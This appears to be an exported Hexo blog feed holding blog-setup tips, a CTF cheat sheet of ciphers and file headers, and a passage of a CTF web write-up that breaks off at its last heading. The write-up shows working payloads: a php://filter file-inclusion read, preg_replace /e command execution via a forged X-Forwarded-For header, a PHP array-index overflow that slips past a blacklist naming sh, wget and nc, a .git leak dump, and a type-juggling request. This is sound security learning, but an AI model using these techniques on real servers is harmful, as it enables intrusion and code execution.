<h1 id="部署时发生errorspawn-failed错误">部署时发生error：spawn failed错误</h1>
<p>首先用<code>ssh -T git@github.com</code>命令测试是否连接，如果不能连接的话，在存放key的目录下新建config文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/65e53d3e1067a501c809fa287407f2be.png?x-oss-process=hzy" alt="MO22Ie.png"></p>
<p>填入以下内容</p>
<pre><code class="hljs plaintext">Host github.com
User 你GitHub的邮箱
Hostname ssh.github.com
PreferredAuthentications publickey
IdentityFile ~/.ssh/id_rsa
Port 443</code></pre>
<p>如果可以正常连接的话，回到博客的根目录，打开_config.yml配置文件</p>
<p>修改以下内容</p>
<pre><code class="hljs plaintext">deploy:

type: git

repo: https://github.com/yourname/yourname.github.io.git


branch: master</code></pre>
<p>其中的repo修改为</p>
<p><code>git@github.com:yourname/yourname.github.io.git</code></p>
<h1 id="页面加载性能">页面加载性能</h1>
<p>博客上线后，需要关注页面的加载速度。<a href="https://developers.google.com/speed/pagespeed/insights/">Google PageSpeed Insights</a> 可用于帮助分析网页加载速度瓶颈，该网站将会针对指定域名进行在线测试，并提供一份详细的页面加载分析报告，报告中还会根据页面资源加载情况给出合理的优化建议及预期优化效果，因此用户可以有的放矢的进行性能优化专项整改。</p>
<p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-deploy-to-VPS/pagespeed-insights.png"><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/606a10e94cc99a1d3aee73d488ba007c.png?x-oss-process=hzy" alt="Google PageSpeed Insights"></a></p>
<p>虽然可以从报告中了解到站点的加载性能瓶颈，但是，报告中仅是提供优化建议，具体的落实还须自己实施。本章节主要介绍 CDN 加速和代码合并压缩两种比较常见的优化方案。</p>
<h2 id="cdn-加速">CDN 加速</h2>
<p>在控制台的 Network Tab 页中可以查看到页面加载瀑布流。在此需要勾选 Disable cache 以避免缓存干扰分析。另外，在所有静态资源中，对加载速度影响较大且存在大幅优化空间的主要还是 JS 脚本，所以我们先拿它开刀。</p>
<p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-deploy-to-VPS/before-optimize.png"><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/8fa6b03ecf301392811b8007e31711af.png?x-oss-process=hzy" alt="页面加载瀑布流"></a></p>
<p>首先理解一下底部信息栏中的这行文字：</p>
<blockquote>
<p>21 / 50 requests | 518 KB / 818KB transferred | Finish: 8.44 s | DOMContentLoaded: 4.36 s | Load: 6.80 s</p>
</blockquote>
<p>主要包括以下几条信息：</p>
<ul>
<li>加载页面总共发起了 50 次请求，下载了 818 KB 资源，其中 JS 脚本资源共计 518 KB，占据了 21 次请求。</li>
<li>在 4.36 s 时 DOM 树渲染完毕（蓝线），此时已经可以看到正常的页面，由于 JS 脚本会阻塞 DOM 解析，所以这段时间是包含了 JS 脚本的下载与执行过程的。</li>
<li>在 6.80 s 时所有资源加载完毕（红线），包括异步的脚本和其他非阻塞的页面资源，如图片、CSS 文件等。</li>
<li>在 8.44 s 时所有 HTTP 请求响应完毕，包括 XHR 请求。</li>
</ul>
<p>关于 Finish / DOMContentLoaded / Load 的讨论请参见 <a href="https://stackoverflow.com/questions/31729240/how-to-analyzing-page-speed-in-chrome-dev-tools">How to analyzing Page Speed in Chrome Dev tools</a> 和 <a href="https://segmentfault.com/q/1010000011840948/a-1020000011947156">chrome devtools 中 network 一栏中的 Finish 时间代表着什么</a>，两者说法不一致，我倾向于认同后者的观点。</p>
<p>分析以上页面加载瀑布流可知，DOM 树的解析渲染主要是被从 VPS 本地下载 jquery、velocity、fancybox 等脚本所滞后，所以对症下药，我们可以改为从开源公共 CDN 加载脚本。</p>
<p>对于在站点中用到的三方插件，在主题配置文件中为其添加 CDN 加载源：</p>
<pre><code class="hljs plaintext">themes\next\_config.ymlvendors:
  jquery: //cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js

  fancybox: https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js
  fancybox_css: https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css

  velocity: https://cdn.jsdelivr.net/npm/velocity-animate@1.2.1/velocity.min.js

  velocity_ui: //cdn.jsdelivr.net/npm/velocity-animate@1.2.1/velocity.ui.min.js

  fontawesome: //cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css

  algolia_instant_js: https://cdn.jsdelivr.net/npm/instantsearch.js@2.4.1/dist/instantsearch.js
  algolia_instant_css: https://cdn.jsdelivr.net/npm/instantsearch.js@2.4.1/dist/instantsearch.min.css

  pace: //cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js
  pace_css: //cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css

  pangu: //cdn.jsdelivr.net/npm/pangu@3.3.0/dist/browser/pangu.min.js

  valine: https://cdn.jsdelivr.net/npm/valine@1.3.3/dist/Valine.min.js</code></pre>
<p>如果开启了 Live2D 看板娘，一样可以通过将脚本来源改为 CDN 来完成性能优化：[](// 修改选中字符的颜色<br>
/* webkit, opera, IE9 <em>/<br>
::selection {<br>
background: #06d633;<br>
color: #f7f7f7;<br>
}<br>
/</em> firefox */<br>
::-moz-selection {<br>
background: #06d633;<br>
color: #f7f7f7;<br>
}</p>
<p>// 代码块选中颜色<br>
.highlight *::selection {<br>
background: #06d633;<br>
})</p>
<pre><code class="hljs plaintext">_config.yml  # Live2D
  ## https://github.com/EYHN/hexo-helper-live2d
  live2d:
    enable: true
    pluginRootPath: live2dw/ # Root path of plugin to be on the site (Relative)
    pluginJsPath: lib/ # JavaScript path related to plugin&#x27;s root (Relative)
    pluginModelPath: assets/ # Relative model path related to plugin&#x27;s root (Relative)
-   scriptFrom: local # Default
+   scriptFrom: jsdelivr # jsdelivr CDN
    tagMode: true # Whether only to replace live2d tag instead of inject to all pages
    log: false # Whether to show logs in console
    model:
      use: live2d-widget-model-shizuku  # 萌系少女
    display:
      position: left
      width: 100
      height: 180
    mobile:
      show: false
    react:
      opacityDefault: 0.7 # 默认透明度</code></pre>
<p>这样可以加快进入博客的速度！</p>
<h1 id="接入daovoice">接入DaoVoice</h1>
<p>接入这个玩意的时候有个大坑，网上也有其他网友反应这个问题，但是直接搜这个问题网上目前是没有任何解决方法的，我在这里记录一下吧</p>
<p>刚开始就是注册个号</p>
<p><a href="http://dashboard.daovoice.io/app/6f081c2c/inboxes/all/conversations/">http://dashboard.daovoice.io/app/6f081c2c/inboxes/all/conversations/</a></p>
<p>注册之后找到这里，安装到网站，找到app_id的值，后面会用到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230102142313468.png?x-oss-process=hzy" alt="image-20230102142313468"></p>
<p>在这个路径之下的这个文件里加入如下代码\themes\next\layout_partials\head\head.swig</p>
<pre><code class="hljs plaintext">&#123;% if theme.daovoice %&#125;
 &lt;script&gt;(function(i,s,o,g,r,a,m)&#123;i[&quot;DaoVoiceObject&quot;]=r;i[r]=i[r]||function()&#123;(i[r].q=i[r].q||[]).push(arguments)&#125;,i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset=&quot;utf-8&quot;;m.parentNode.insertBefore(a,m)&#125;)(window,document,&quot;script&quot;,(&#x27;https:&#x27; == document.location.protocol ? &#x27;https:&#x27; : &#x27;http:&#x27;) + &quot;//widget.daovoice.io/widget/b6dbddb6.js&quot;,&quot;daovoice&quot;)
 daovoice(&#x27;init&#x27;, &#123;
  app_id: &quot;app_id&quot;  //这里填写刚才说的app_id
&#125;);
daovoice(&#x27;update&#x27;);
 &lt;/script&gt;
&#123;% endif %&#125;</code></pre>
<p>然后进入到主题配置文件，最后加上</p>
<pre><code class="hljs plaintext">daovoice: true
daovoice_app_id: #这地方填上app_id</code></pre>
<p>最重要的坑来了，这个时候如果直接部署上去就会发现虽然这个功能出来了但是博客白页了，不显示文章了，原因其实是velocity这个next插件与这个在线聊天功能不兼容</p>
<p>在主题配置文件中找到之后关上再部署上去就可以了，而且也不会有啥影响，这个插件就是动画效果，其实开着也是摆设，基本用不上</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230102142753884.png?x-oss-process=hzy" alt="image-20230102142753884"></p>
<p>这个时候再部署上去就没问题了</p>
<p>推荐：</p>
<p><a href="https://blog.csdn.net/u012195214/article/details/79204088?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-5.pc_relevant_default&amp;spm=1001.2101.3001.4242.4&amp;utm_relevant_index=8">NexT主题的优化定制修改指南</a></p>
<p><a href="https://blog.csdn.net/as480133937/article/details/100138838?spm=1001.2101.3001.6650.13&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-13.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-13.pc_relevant_default&amp;utm_relevant_index=20">Hexo-Next 主题博客个性化配置超详细，超全面</a></p>
<p>[hexo 主题 next7.8 版本配置美化](<a href="https://blog.csdn.net/qq_35396510/article/details/105953460?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_default&amp;utm_relevant_index=3">(11条消息) hexo 主题 next7.8 版本配置美化_uKnow_AL的博客-CSDN博客_next7.8</a>)</p>
<p><a href="https://blog.csdn.net/tuckEnough/article/details/107383201?spm=1001.2101.3001.6650.12&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-12.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-12.pc_relevant_default&amp;utm_relevant_index=16"> hexo theme next7.8 主题美化</a></p>
<p><a href="http://theme-next.iissnan.com/theme-settings.html">next主题配置</a></p>
<p><a href="https://hexo.io/plugins/">hexo插件</a></p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>博客部分问题解决方法</tag>
        <tag>常用指令</tag>
        <tag>博客主题优化</tag>
      </tags>
  </entry>
  <entry>
    <title>常见密码类型</title>
    <url>/2022/02/08/%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p>通过几次比赛发现掌握必备的常见密码类型以及常见的文件头类型必不可少，在这里记录一下！</p>
<span id="more"></span>
<p>学习过程中发现密码学不仅仅和cypto有联系，在web的比赛中也时常会遇到，所以掌握住必不可少。记录一下常见的密码类型以及特征。</p>
<h1 id="摩斯密码">摩斯密码</h1>
<p><strong>特征</strong></p>
<p>用点（.）和划（-）来编码范围<strong>0-9、A-Z</strong>的字符，字母不区分大小写，两个字母之间的空格用斜杠（/）或者三个点（.）或者一个划（-）表示，两个单词之间的间隔是七个点（.）。 根据摩斯编码的原理，CTF中也有出现过变种的摩斯编码，比如点（.）和划（-）用数字0和1来表示等此类变种的思路。类似于下面的这样：</p>
<h1 id="摩斯电码变种">摩斯电码变种</h1>
<pre><code class="hljs plaintext">0010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101</code></pre>
<pre><code class="hljs plaintext">flag&#123;&#125;m0rse_code_1s_interest1n9!&#125;</code></pre>
<p>特点：由0和1组成，并且每段的长度不一样</p>
<h1 id="敲击码">敲击码</h1>
<p><strong>特征</strong></p>
<p>敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是K字母被整合到C中，因此密文的特征为1-5的两位一组的数字，编码的范围是A-Z字母字符集，字母不区分大小写。</p>
<h1 id="md5">md5</h1>
<p><strong>特征</strong></p>
<p>一般为32位 由数字和小写字母组成</p>
<h1 id="base64">base64</h1>
<p><strong>特征</strong></p>
<p>base64 的空格被加密成=，但是也有密文加密没有=的，多观察吧</p>
<h1 id="base16">base16</h1>
<p><strong>特征</strong></p>
<p>由数字和大写字母组成</p>
<h1 id="base58">base58</h1>
<p><strong>特征</strong></p>
<p><strong>Base58</strong>是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。相比Base64，Base58不使用数字&quot;0&quot;，字母大写&quot;O&quot;，字母大写&quot;I&quot;，和字母小写&quot;l&quot;，以及&quot;+“和”/&quot;符号。</p>
<h1 id="unicode">unicode</h1>
<p><strong>特征</strong></p>
<p>每一字符都用一个5位字符编码表示，并用\分割</p>
<h1 id="ook语言">OOK语言</h1>
<pre><code class="hljs plaintext">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.……</code></pre>
<pre><code class="hljs plaintext">flag&#123;ok-ctf-1234-admin&#125;</code></pre>
<h1 id="ook语言变形">OOK语言变形</h1>
<pre><code class="hljs plaintext">..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!........ ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?...... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?!!!!!!!!! !?.?! .?!.? ..... ....! ?!!.? ..... ...?. ?!.?. .....</code></pre>
<pre><code class="hljs plaintext">flag&#123;bugku_jiami&#125;</code></pre>
<h1 id="凯撒密码">凯撒密码</h1>
<p>明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>
密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC</p>
<p>特点： 在原来字符上进行一定的偏移</p>
<h1 id="escape">escape</h1>
<pre><code class="hljs plaintext">flag%7Bi-will-kill-you%21%7D</code></pre>
<pre><code class="hljs plaintext">flag&#123;i-will-kill-you!&#125;</code></pre>
<h1 id="rot13">rot13</h1>
<pre><code class="hljs plaintext">Ubj pna lbh gryy na rkgebireg sebz na vagebireg ng AFN? In the elevators, the extrovert looks at the OTHER guy&#x27;s shoes.</code></pre>
<pre><code class="hljs plaintext">How can you tell an extrovert from an introvert at NSA? Va gur ryringbef, gur rkgebireg ybbxf ng gur BGURE thl&#x27;f fubrf.</code></pre>
<h1 id="jsfuck">jsfuck</h1>
<pre><code class="hljs plaintext">(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+</code></pre>
<pre><code class="hljs plaintext">flag&#123;hhaj&#125;</code></pre>
<p>解决方法：F12打开控制台将密文复制进去，回车就可以得到 密码</p>
<p>常见文件头：</p>
<table>
<thead>
<tr>
<th style="text-align:left">文件类型：</th>
<th style="text-align:left">文件头信息：</th>
<th style="text-align:left">文件尾信息：</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>JPEG (jpg)</strong></td>
<td style="text-align:left"><strong>FFD8FFE0或FFD8FFE1或FFD8FFE8</strong></td>
<td style="text-align:left">FF</td>
</tr>
<tr>
<td style="text-align:left">PNG (png)</td>
<td style="text-align:left">89 50 4E 47</td>
<td style="text-align:left">00 3B</td>
</tr>
<tr>
<td style="text-align:left">pdf</td>
<td style="text-align:left">25 50 44 46 2D 31 2E</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">Windows Password (pwl)</td>
<td style="text-align:left">E3 82 85 96</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">RAR</td>
<td style="text-align:left">52 61 72 21</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">ZIP Archive (zip)</td>
<td style="text-align:left">50 4B 03 04</td>
<td style="text-align:left">50 4B</td>
</tr>
<tr>
<td style="text-align:left">压缩包</td>
<td style="text-align:left">PK</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">Word/Excel (xls.or.doc)</td>
<td style="text-align:left">D0 CF 11 E0</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">HTML (html)</td>
<td style="text-align:left">68 74 6D 6C 3E</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">MIDI (mid)</td>
<td style="text-align:left">4D 54 68 64</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">7z</td>
<td style="text-align:left">37 7A BC AF 27 1C</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">GIF</td>
<td style="text-align:left">47 49 46 38 39 61</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">bmp</td>
<td style="text-align:left">42 4D 76 68</td>
<td style="text-align:left"></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界web高手进阶区(二)</title>
    <url>/2022/07/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA(%E4%BA%8C)/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071808494.png?x-oss-process=hzy" alt="image-20220707180845375"></p>
<span id="more"></span>
<h1 id="ics-05">ics-05</h1>
<blockquote>
<p>其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</p>
</blockquote>
<ul>
<li>文件包含</li>
<li>XFF</li>
</ul>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730509.png?x-oss-process=hzy" alt="image-20220626130518839"></p>
<p>点云平台设备维护中心，可以看到payload发生变化</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730498.png?x-oss-process=hzy" alt="image-20220626130627380"></p>
<p>利用php伪协议查看源码，转义得到源码</p>
<pre><code class="hljs plaintext">?page=php://filter/read=convert.base64-encode/resource=index.php</code></pre>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);

@session_start();
posix_setuid(1000);


?&gt;
&lt;!DOCTYPE HTML&gt;
&lt;html&gt;

&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot; media=&quot;all&quot;&gt;
    &lt;title&gt;设备维护中心&lt;/title&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;ul class=&quot;layui-nav&quot;&gt;
        &lt;li class=&quot;layui-nav-item layui-this&quot;&gt;&lt;a href=&quot;?page=index&quot;&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
    &lt;fieldset class=&quot;layui-elem-field layui-field-title&quot; style=&quot;margin-top: 30px;&quot;&gt;
        &lt;legend&gt;设备列表&lt;/legend&gt;
    &lt;/fieldset&gt;
    &lt;table class=&quot;layui-hide&quot; id=&quot;test&quot;&gt;&lt;/table&gt;
    &lt;script type=&quot;text/html&quot; id=&quot;switchTpl&quot;&gt;
        &lt;!-- 这里的 checked 的状态只是演示 --&gt;
        &lt;input type=&quot;checkbox&quot; name=&quot;sex&quot; value=&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin=&quot;switch&quot; lay-text=&quot;开|关&quot; lay-filter=&quot;checkDemo&quot; &#123;&#123; d.id==1 0003 ? &#x27;checked&#x27; : &#x27;&#x27; &#125;&#125;&gt;
    &lt;/script&gt;
    &lt;script src=&quot;layui/layui.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
    &lt;script&gt;
    layui.use(&#x27;table&#x27;, function() &#123;
        var table = layui.table,
            form = layui.form;

        table.render(&#123;
            elem: &#x27;#test&#x27;,
            url: &#x27;/somrthing.json&#x27;,
            cellMinWidth: 80,
            cols: [
                [
                    &#123; type: &#x27;numbers&#x27; &#125;,
                     &#123; type: &#x27;checkbox&#x27; &#125;,
                     &#123; field: &#x27;id&#x27;, title: &#x27;ID&#x27;, width: 100, unresize: true, sort: true &#125;,
                     &#123; field: &#x27;name&#x27;, title: &#x27;设备名&#x27;, templet: &#x27;#nameTpl&#x27; &#125;,
                     &#123; field: &#x27;area&#x27;, title: &#x27;区域&#x27; &#125;,
                     &#123; field: &#x27;status&#x27;, title: &#x27;维护状态&#x27;, minWidth: 120, sort: true &#125;,
                     &#123; field: &#x27;check&#x27;, title: &#x27;设备开关&#x27;, width: 85, templet: &#x27;#switchTpl&#x27;, unresize: true &#125;
                ]
            ],
            page: true
        &#125;);
    &#125;);
    &lt;/script&gt;
    &lt;script&gt;
    layui.use(&#x27;element&#x27;, function() &#123;
        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
        //监听导航点击
        element.on(&#x27;nav(demo)&#x27;, function(elem) &#123;
            //console.log(elem)
            layer.msg(elem.text());
        &#125;);
    &#125;);
    &lt;/script&gt;

&lt;?php

$page = $_GET[page];

if (isset($page)) &#123;



if (ctype_alnum($page)) &#123;
?&gt;

    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
    &lt;div style=&quot;text-align:center&quot;&gt;
        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;
    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;

&lt;?php

&#125;else&#123;

?&gt;
        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
        &lt;div style=&quot;text-align:center&quot;&gt;
            &lt;p class=&quot;lead&quot;&gt;
                &lt;?php

                if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123;
                    die();
                &#125;

                if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123;
                    die();
                &#125;

                if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123;
                    die();
                &#125;

                if ($page === &#x27;index.php&#x27;) &#123;
                    die(&#x27;Ok&#x27;);
                &#125;
                    include($page);
                    die();
                ?&gt;
        &lt;/p&gt;
        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;

&lt;?php
&#125;&#125;


//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;

    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;
        preg_replace($pattern, $replacement, $subject);
    &#125;else&#123;
        die();
    &#125;

&#125;





?&gt;

&lt;/body&gt;

&lt;/html&gt;</code></pre>
<p>加XFF，构造payload</p>
<pre><code class="hljs plaintext">GET /index.php?pat=/123/e&amp;rep=system(&quot;find+-iname+flag&quot;)&amp;sub=123456 HTTP/1.1
Host: 111.200.241.244:54061
Cache-Control: max-age=0
X-Forwarded-For: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=g69j1stg83bo1v3hh4h0q25v93
Connection: close</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730493.png?x-oss-process=hzy" alt="image-20220626131658945"></p>
<pre><code class="hljs plaintext">GET /index.php?pat=/123/e&amp;rep=system(&quot;cat+./s3chahahaDir/flag/flag.php&quot;)&amp;sub=123456 HTTP/1.1
Host: 111.200.241.244:54061
Cache-Control: max-age=0
X-Forwarded-For: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=g69j1stg83bo1v3hh4h0q25v93
Connection: close</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730427.png?x-oss-process=hzy" alt="image-20220626131907894"></p>
<h1 id="favorite_number">favorite_number</h1>
<ul>
<li>整型溢出</li>
</ul>
<pre><code class="hljs plaintext">&lt;?php
//php5.5.9
$stuff = $_POST[&quot;stuff&quot;];
$array = [&#x27;admin&#x27;, &#x27;user&#x27;];
if($stuff === $array &amp;&amp; $stuff[0] != &#x27;admin&#x27;) &#123;  // stuff和array强等于且字符串首字母不同
    $num= $_POST[&quot;num&quot;];
    if (preg_match(&quot;/^\d+$/im&quot;,$num))&#123;     // num字符串全部由数字组成，大小写不敏感，跨行检测
        if (!preg_match(&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;,$num))&#123;  
         //黑名单
            echo &quot;my favorite num is:&quot;;
            system(&quot;echo &quot;.$num);
        &#125;else&#123;
            echo &#x27;Bonjour!&#x27;;
        &#125;
    &#125;
&#125; else &#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p>利用PHP的数组下标的一个BUG，可以利用<code>整型溢出</code></p>
<p>payload</p>
<pre><code class="hljs plaintext">stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123456</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730579.png?x-oss-process=hzy" alt="image-20220626132356734"></p>
<blockquote>
<p>%0a是换行符可以进行绕过</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730649.png?x-oss-process=hzy" alt="image-20220626132535363"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730831.png?x-oss-process=hzy" alt="image-20220626132659282"></p>
<p>但是这样直接读取读不出来，用inode索引节点，先寻找flag的inode</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730680.png?x-oss-process=hzy" alt="image-20220626132809315"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730930.png?x-oss-process=hzy" alt="image-20220626133015558"></p>
<h1 id="lottery">lottery</h1>
<ul>
<li>git源码泄露</li>
<li>robots</li>
</ul>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730750.png?x-oss-process=hzy" alt="image-20220626133246971"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730686.png?x-oss-process=hzy" alt="image-20220626133235488"></p>
<p>使用 GitHack 扫描 url，成功把泄露的文件都下载下来，发现api.php</p>
<pre><code class="hljs plaintext">GitHack.py http://220.249.52.133:58698/.git/</code></pre>
<pre><code class="hljs plaintext">function buy($req)&#123;
   require_registered();
   require_min_money(2);

   $money = $_SESSION[&#x27;money&#x27;];
   $numbers = $req[&#x27;numbers&#x27;];
   $win_numbers = random_win_nums();
   $same_count = 0;
   for($i = 0; $i &lt; 7; $i++)&#123;
      if($numbers[$i] == $win_numbers[$i])&#123;
         $same_count++;
      &#125;
   &#125;
   switch ($same_count) &#123;
      case 2:
         $prize = 5;
         break;
      case 3:
         $prize = 20;
         break;
      case 4:
         $prize = 300;
         break;
      case 5:
         $prize = 1800;
         break;
      case 6:
         $prize = 200000;
         break;
      case 7:
         $prize = 5000000;
         break;
      default:
         $prize = 0;
         break;
   &#125;
   $money += $prize - 2;
   $_SESSION[&#x27;money&#x27;] = $money;
   response([&#x27;status&#x27;=&gt;&#x27;ok&#x27;,&#x27;numbers&#x27;=&gt;$numbers, &#x27;win_numbers&#x27;=&gt;$win_numbers, &#x27;money&#x27;=&gt;$money, &#x27;prize&#x27;=&gt;$prize]);
&#125;</code></pre>
<p>改包，修改 numbers 变量为一个数组，其中的 7 个变量都是 true</p>
<pre><code class="hljs plaintext">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730784.png?x-oss-process=hzy" alt="image-20220707162511752"></p>
<blockquote>
<p>这里要注意类型一定要加上去，要不然会报错</p>
</blockquote>
<p>然后赚钱购买flag就行了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730555.png?x-oss-process=hzy" alt="image-20220707162558032"></p>
<h1 id="mfw">mfw</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730673.png?x-oss-process=hzy" alt="image-20220707170737233"></p>
